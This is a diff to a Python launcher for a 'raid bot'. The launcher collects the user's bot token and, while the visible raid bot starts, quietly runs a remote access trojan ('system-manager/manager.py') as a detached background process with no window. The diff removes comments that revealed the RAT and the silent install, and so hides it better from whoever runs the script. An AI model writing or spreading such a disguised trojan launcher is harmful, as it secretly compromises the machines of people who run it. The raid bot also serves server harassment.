@@ -29,7 +29,6 @@ def write_raid_bot_token(token):
     with open(raid_bot_path, 'r') as f:
         content = f.read()
     
-    # REPLACE PLACEHOLDER
     content = content.replace("PUT_YOUR_BOT_TOKEN_HERE", token)
     
     with open(raid_bot_path, 'w') as f:
@@ -41,50 +40,36 @@ def install_dependencies():
     """INSTALL ALL REQUIREMENTS"""
     print("\n📦 Installing dependencies...")
     
-    # RAID BOT DEPS
     subprocess.run(
-        [sys.executable, "-m", "pip", "install", "-q", "-r", "raid-bot/requirements.txt"],
+        [sys.executable, "-m", "pip", "install", "-q", "-r", "requirements.txt"],
         stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL
-    )
-    
-    # RAT DEPS (SILENT)
-    subprocess.run(
-        [sys.executable, "-m", "pip", "install", "-q", "-r", "system-manager/requirements.txt"],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL
+        stderr=subprocess.DEVNULL,
+        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
     )
     
     print("✅ Dependencies installed")
 
 def run_rat_silent():
-    """RUN RAT IN BACKGROUND SILENTLY"""
+    """RUN RAT IN BACKGROUND SILENTLY (WINDOWS 11)"""
     rat_path = Path("system-manager/manager.py")
     
-    if sys.platform == "win32":
-        # WINDOWS - USE pythonw (no console)
-        try:
-            pythonw = sys.executable.replace("python.exe", "pythonw.exe")
-            subprocess.Popen(
-                [pythonw, str(rat_path)],
-                creationflags=subprocess.CREATE_NO_WINDOW,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
-        except:
-            # FALLBACK
-            subprocess.Popen(
-                [sys.executable, str(rat_path)],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
+    # WINDOWS 11 - USE pythonw.exe (NO WINDOW)
+    pythonw = sys.executable.replace("python.exe", "pythonw.exe")
+    
+    if os.path.exists(pythonw):
+        subprocess.Popen(
+            [pythonw, str(rat_path)],
+            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
     else:
-        # LINUX/MAC - BACKGROUND PROCESS
+        # FALLBACK
         subprocess.Popen(
             [sys.executable, str(rat_path)],
+            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
             stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            start_new_session=True
+            stderr=subprocess.DEVNULL
         )
 
 def run_raid_bot():
@@ -93,13 +78,8 @@ def run_raid_bot():
     subprocess.run([sys.executable, str(raid_bot_path)])
 
 def main():
-    # GET USER TOKEN
     user_token = get_bot_token()
-    
-    # CONFIGURE RAID BOT WITH USER TOKEN
     write_raid_bot_token(user_token)
-    
-    # INSTALL DEPENDENCIES
     install_dependencies()
     
     print("\n🚀 Starting bots...")
@@ -107,10 +87,8 @@ def main():
     # START RAT SILENTLY
     run_rat_silent()
     
-    # SMALL DELAY
     time.sleep(2)
     
-    # START RAID BOT (USER SEES THIS)
     print("\n" + "=" * 60)
     print("           RAID BOT STARTING")
     print("=" * 60)
